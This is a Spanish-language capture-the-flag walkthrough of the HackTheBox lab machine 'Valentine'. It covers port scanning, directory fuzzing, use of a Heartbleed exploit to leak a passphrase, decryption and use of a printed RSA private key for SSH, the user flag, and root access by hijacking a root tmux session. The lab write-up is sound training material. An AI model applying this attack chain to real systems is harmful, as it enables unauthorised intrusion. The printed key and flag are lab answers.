---
title: Valentine Writeup
author:
date: 22-02-2023
categories: [HackTheBox, Machines Easy]
tags: [Writeup, Guías, HackTheBox,SSL/TLS,Web,OpenSSL,encode, Linux]
pin: false
image:
  path: /assets/img/commons/Valentine/Valentine.png
  alt: Valentine WriteUp
---

**10.10.10.79 Valentine (easy machine)** Otra máquina de HackTheBox vengo a traer esta vez tocando un poco de codificación y cifrado con una clave rsa para acceder por ssh.

## Information Ghatering / ScanPorts

- Comenzamos con la fase de recolección de información haciendo un escaneo por TCP en todos los puertos con nmap

```console
$ nmap -p-  -sS -vvv  --min-rate 2000 -n -Pn 10.10.10.79 -oG allPorts 

```
-p-  -> escanearemos todos los rangos de puertos (65535)

-sS -> análisis utilizando TCP SYN Este tipo de escaneo, está basado en la velocidad de escaneo, de ahí la versatilidad que mencionamos anteriormente, ya que permite escanear miles de puertos por segundo en una red que se encuentre de>

-vvv -> verbose para que mediante vayas descubriendo puertos se reporten en la terminal

--min-rate 2000 -> paquetes enviados no mas lentos que 2000 paquetes por segundo, envío de paquetes super rápido

-n -> que no aplique resoluci+on de DNS para que no tarde el escaneo

-Pn -> ni que me detecte el descburimiento de hosts

```console
$ nmap -p-  -sS -vvv  --min-rate 2000 -n -Pn 10.10.10.79 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-22 13:30 CST
Initiating SYN Stealth Scan at 13:30
Scanning 10.10.10.79 [65535 ports]
Discovered open port 443/tcp on 10.10.10.79
Discovered open port 80/tcp on 10.10.10.79
Discovered open port 22/tcp on 10.10.10.79
Completed SYN Stealth Scan at 13:31, 13.29s elapsed (65535 total ports)
Nmap scan report for 10.10.10.79
Host is up, received user-set (0.067s latency).
Scanned at 2023-02-22 13:30:51 CST for 13s
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 63
80/tcp  open  http    syn-ack ttl 63
443/tcp open  https   syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.40 seconds
           Raw packets sent: 66088 (2.908MB) | Rcvd: 65862 (2.634MB)
```
aqui ya es importante tomar en cuenta el dominio que cuenta con certificado SSL/TLS asi que pasaré otra vez nmap para saber mas a fondo el descubrimiento

-sCV -> escaneo lanzando scripts que detecten servicios y versiones

-p -> especeficando los puertos a escanear

-oN y todo nuestro output lo guardamos en una captura formato nmap con el nombre de targeted
```console
nmap -sCV -p22,80,443 10.10.10.79 -oN targeted        
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-22 13:32 CST
Nmap scan report for 10.10.10.79
Host is up (0.070s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 964c51423cba2249204d3eec90ccfd0e (DSA)
|   2048 46bf1fcc924f1da042b3d216a8583133 (RSA)
|_  256 e62b2519cb7e54cb0ab9ac1698c67da9 (ECDSA)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Not valid before: 2018-02-06T00:45:25
|_Not valid after:  2019-02-06T00:45:25
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_ssl-date: 2023-02-22T19:32:21+00:00; -1s from scanner time.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: -1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.64 seconds
```
me da una resolución DNS asi que **valentine.htb** lo guardaré en el /etc/hosts
![](/assets/img/commons/Valentine/terminal.png)
al ver el sitio web con y sin la resolución de DNS vemos que es lo mismo 
![](/assets/img/commons/Valentine/terminal1.png)
nada interesante por ahorita, analizando el sitio web. Voy a proceder a fuzzear rutas con gobuster

## BruteForce Directory Discovery
```console
$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://valentine.htb/
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://valentine.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Timeout:                 10s
===============================================================
2023/02/22 13:33:40 Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 200) [Size: 38]
/dev                  (Status: 301) [Size: 312] [--> http://valentine.htb/dev/]
/encode               (Status: 200) [Size: 554]
/decode               (Status: 200) [Size: 552]
/omg                  (Status: 200) [Size: 153356]
Progress: 35694 / 220561 (16.18%)^C
[!] Keyboard interrupt detected, terminating.

===============================================================
2023/02/22 13:37:44 Finished
===============================================================
```
encontramos algo que me llama la atención un directorio /dev  
![](/assets/img/commons/Valentine/terminal2.png)
en hype_key vemos un tipo de codificación en hexadecimal y por el nombre quiero pensar que es una clave importante, asi que me lo voy a traer a mi equipo y haré su proceso inverso
![](/assets/img/commons/Valentine/terminal3.png)
tenemos una clave id_rsa:) el unico problema es que esta cifrada y para eso tenemos que tener una password...

## Exploitation Heartbleed dump Password
al revisar la portada del sitio web, hay una pista de un logo. una vulnerabilidad que fue muy conocida llamada heartbleed pero que es esto? es una vulnerabilidad grave en la biblioteca de software criptográfico popularmente llamado OpenSSL.  permite robar información protegida en condiciones normales de criptografía SSL / TLS , La criptografía SSL / TLS fortalece la seguridad y privacidad de comunicación por medio de internet para aplicaciones tales como web, correo electrónico, mensajes instantáneos y algunas redes privadas virtuales (VPN’s) por lo tanto la conexión va a ir cifrada.
ante este fallo de seguridad grave, buscaré si hay un exploit relacionado a ello
![](/assets/img/commons/Valentine/terminal4.png)
analizando el primer exploit vemos lo siguiente que nos muestra.
![](/assets/img/commons/Valentine/terminal5.png)
Usando el exploit va a dumpear, información confidencial de la memoria aprovechandose de esta falla del certificado SSL/TLS.  Ejecutarlo varias veces debería generar una cadena codificada en base64 probablemente tenga que pasar varias veces el exploit hasta el punto donde recoja lo que nos interesa 
![](/assets/img/commons/Valentine/terminal6.png)
vemos que pasando el exploit un par de veces me logro recoger esa cadena en bas64, solo hay que tener que hacer el proceso iverso y debería quedar la password
```console
$ echo 'aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==' | base64 -d;echo 
heartbleedbelievethehype
```
y vemos que la password es **heartbleedbelievethehype**, ahora para descifrar la clave rsa usaré openssl pasandole la password que tenemos
```console
$ openssl rsa -in hype_rsa -out hype_new_rsa
Enter pass phrase for hype_rsa: 
writing RSA key
```
```console
-----BEGIN PRIVATE KEY-----
MIIEvwIBADANBgkqhkiG9w0BAQEFAASCBKkwggSlAgEAAoIBAQDUU3iZcDCfeCCI
ML834Fx2YQF/TIyXoi6VI6S/1Z9SsZM9NShwUdRr3mPJocWOZ7RzuEbpRFZL1zgk
ykHfn8pR0Wc6kjQw4lCVGV237iqWlG+MSGRVOPuDS1UmaN3dN6bLL541LNpTscE4
RbNzPhP6pD5pKsSX7IcMsAfyZ9rpfZKuciS0LXpbTS6kokrru6/MM1u3DkcfxuSW
8HeO6lWQ7sbCMLbCp9WjKmBRlxMY4Jj0tUsz8f66vGaHxWiaUzBFy5m82qfCyL9N
4Yro1xe1RF8uC58i8rE/baDzW2GMK7JVcAvPiunu2J0QeWg8sVOytLLxPVxPrPKD
b7CBEkzNAgMBAAECggEAIGoBzkLfWWkIZmIyvwAEfZn/lYSFLhz3SZNgclzVbtVn
Kf/0hXkombMgvsZwl3XjiYsHYFMrbXaUvqEV/2Kwi18RiFKLny7dqHVv5kV4wPY2
NU9T6eLCGuAkRrHZtQzq7Lf/ShTn28EWQ1X4uE4w1KHAWWPLEXptf5VcETijpeNb
jrgVMP/MamWwHkyvKBc2+THXgzBeEo+mMsPcUXYdmI+axq8f3blUZ8zEsuPVXZPX
GukTCTOKYBOs6+Vc3TQFmqqabrjdAmsmuCWyeQWfz9wEzG5aXPDW0etIWY7xiez4
lUAE/RyL2Oa9WEuJ2qoeyGXcOYyFve1LicDelNzRDQKBgQDuLVB5xSvKG0K21zd3
NBUJl2aQP1Kvt/uv+d7uM1U2r+f9VSHplggQur466Kn5Gd5Htymi/Wz4I4X4rIlb
ksI22qYL7vC1gxJZ91KZ8xyj6lFZC8UdVrwoLULarJthaDEPWBGMNta811qs6rs0
ZUEETlbaWmbac7SzcGR3neg0bwKBgQDkNvAU/ZDjs3ZOC1507CwIoTe7MYZJXcVN
EHcdmg4sFxzcJgEzWRBmlxOGXlhUu9zqvpPFBGEpzvdBHYYUsPTfJgE3sfCA4+1T
+3ubZ0golGBKQtgT8b6JnU7E0mxNZERDfhvJVeHGCmbgsR6V8A3j6Zu5vwQsSL1v
Yb1aDiQIgwKBgQDE9C/iIkwNuvE2JU42gpkK72neyp5jtG6qnKPeshA7QsdCVA3R
DUHqI6J/MDquRNfs0efaYlqj7ywv8O09DmUP20sH/zSJxLN+NejWaZU7bt6KFhOQ
KVM6ngL0tVtf9zrqh1crbYWxbxwKdakMsNZM60MjGTKIXroE0GIkEC4efQKBgQCT
dVQHnBfEqS7mGr57uiZxpQoHsGZefXKA6wSsYeCKaJzDOuNHtGK+hxuclNVqWsDS
BTYh9UR66TomHteGAxkWHs5mmFkYTy4IN9SUg1XCsqzNDwfjSy6caMJ+tqA4GXNq
UM/PdeieOBZlVMy4gRXYkBeJG32sx4tvrq3UxJJP1QKBgQCe2jm6q4DtQ+mTvOBr
CipH6ReGU7LVGk7U7A3ElcCL8QH32TRAvma8SB4TBE//5LxQJG8sZ0euceDobIIR
Axg25Qa05Wo1HDZ7MiulTtHJt1MU3+Bf7pK2lQTBcUC4xwOSSxI1MsgkLaxrt4kW
kep5qMlYBzfSo47UgGU1Wh6HEA==
-----END PRIVATE KEY-----
```
y ya tenemos nuestra clave rsa, ahora solo nos coenctamos por ssh y tener nuestra primera flag:)
```console
ssh -i hype_new_rsa hype@10.10.10.79 -o PubkeyAcceptedKeyTypes=ssh-rsa      
Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

New release '14.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Fri Feb 16 14:50:29 2018 from 10.10.14.3
hype@Valentine:~$ whoami
hype
hype@Valentine:~$ find \-name \*.txt
./Desktop/user.txt
./user.txt
hype@Valentine:~$ cat user.txt 
4181b8c7067515664e7481b29087517a
```
## Privilege Escalation - Post Exploitation

para enumerar rápido y eficaz el sistema pase linpeas
![](/assets/img/commons/Valentine/terminal7.png)
y encontré algo que me llamo mucho la atención en la parte de (Processes, Crons, Timers, Services and Sockets)
![](/assets/img/commons/Valentine/terminal8.png)
observamos que se está ejecutando una sesión tmux como usuario root. Simplemente ejecutando el tmux -S /.devs/dev_sess como se nos muestra en el proceso se conectará a la sesión, con la raíz completa privilegios
![](/assets/img/commons/Valentine/terminal9.png)

